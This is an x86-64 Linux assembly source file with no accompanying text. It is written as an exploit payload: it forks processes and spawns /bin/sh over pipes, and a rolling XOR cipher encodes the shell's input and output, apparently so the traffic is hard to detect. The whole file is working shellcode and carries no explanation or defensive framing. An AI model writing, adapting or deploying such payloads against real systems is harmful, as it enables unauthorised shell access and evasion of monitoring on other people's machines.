bits 64

SYS_PIPE    equ 22
SYS_FORK    equ 57
SYS_CLOSE   equ 3
SYS_DUP2    equ 33
SYS_EXECVE  equ 59
SYS_EXIT    equ 60
SYS_READ    equ 0
SYS_WRITE   equ 1

section .text
    global _start

_start:

    ; create variables on the stack to create pipes
    sub rsp,    16
    lea r12,    [rsp]
    lea r13,    [rsp+4]
    lea r14,    [rsp+8]
    lea r15,    [rsp+12]

    ; create 2 pipes
    mov         rdi, r12
    mov         rax, SYS_PIPE
    syscall
    mov         rdi, r14
    mov         rax, SYS_PIPE
    syscall

    ; fork and jump to else if statement if returns 0, rbx holds return value of syscall
    mov         rax, SYS_FORK
    syscall
    cmp         rax, 0
    jz          ELSE_IF

    ; perform if statement, close and jump to encode
    
    ; close(in_pipe[0]);
    xor         rax, rax
    mov         eax, [rsp]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; close(out_pipe[0]);
    mov         eax, [rsp+8]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; close(out_pipe[1]);
    mov         eax, [rsp+12]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; encode(0 , in_pipe[1]);
    mov         rdi, 0
    mov         eax, [rsp+4]
    mov         rsi, rax
    call        ENCODE

    ; exit
    jmp         EXIT


ELSE_IF:

    ; fork and jump to last if statement if returns 0, rbx holds return value of syscall
    mov         rax, SYS_FORK
    syscall
    cmp         rax, 0
    jz          ELSE

    ; close(out_pipe[1]);
    mov         eax, [rsp+12]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; close(in_pipe[0]);
    mov         eax, [rsp]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; close(in_pipe[1]);
    mov         eax, [rsp+4]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; encode(out_pipe[0], 2);
    mov         eax, [rsp+8]
    mov         rdi, rax
    mov         rsi, 2
    call        ENCODE

    ; exit
    jmp         EXIT

ELSE:

    ; close(in_pipe[1]);
    mov         rdi, r13
    mov         eax, [rsp+4]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; close(out_pipe[0]);
    mov         eax, [rsp+8]
    mov         rdi, rax
    mov         rax, SYS_CLOSE
    syscall

    ; dup2(in_pipe[0], 0);
    mov         eax, [rsp+0]
    mov         rdi, rax
    mov         rsi, 0
    mov         rax, SYS_DUP2
    syscall

    ; dup2(out_pipe[1], 1);
    mov         eax, [rsp+12]
    mov         rdi, rax
    mov         rsi, 1
    mov         rax, SYS_DUP2
    syscall

    ; dup2(out_pipe[1], 2);
    mov         eax, [rsp+12]
    mov         rdi, rax
    mov         rsi, 2
    mov         rax, SYS_DUP2
    syscall

    ; execute shellcode
    ; execve("/bin/sh", {"/bin/sh", NULL}, {NULL})
    xor     rax, rax
    push    rax
    mov     rdi, '/bin//sh'
    push    rdi
    mov     rdi, rsp
    push    rax
    mov     rdx, rsp
    push    rdi
    mov     rsi, rsp
    mov     rax, SYS_EXECVE
    syscall

    ; exit
    jmp         EXIT

ENCODE:
    ; prologue
    push    rbp
    mov     rbp, rsp

    mov     r8, 0xc9 ; k = 0xc9 
    mov     r9, rdi
    mov     r10, rsi
    xor     rax, rax
    push    rax

WHILE_TRUE:
    ; val = fd_in.read(1)
    mov     rsi, rsp
    mov     rdx, 1
    mov     rdi, r9
    xor     rax, rax
    mov     rax, SYS_READ
    syscall

    ; if not val (val is 0), break out of loop
    cmp     rax, 1
    jne     BREAK

    ; val = chr(ord(val) ^ k)
    ; xor the byte not the register
    xor     rax, rax
    mov     al, [rsi]
    xor     rax, r8
    mov     [rsi], al

    ; k += 1
    add     r8, 0x1
    
    ; k = k & 0 xff
    and     r8, 0xff
    
    ; fd_out.write(val)

    mov     rdi, r10
    mov     rax, SYS_WRITE
    mov     rdx, 1
    syscall

    jmp     WHILE_TRUE

BREAK:
    ; epilogue
    mov     rsp, rbp
    pop     rbp
    ret

EXIT:
    add     rsp, 16           ; move ESP to point to saved registers
    mov     rax, SYS_EXIT     ; exit
    xor     rdi, rdi          ; set exit code to 0
    syscall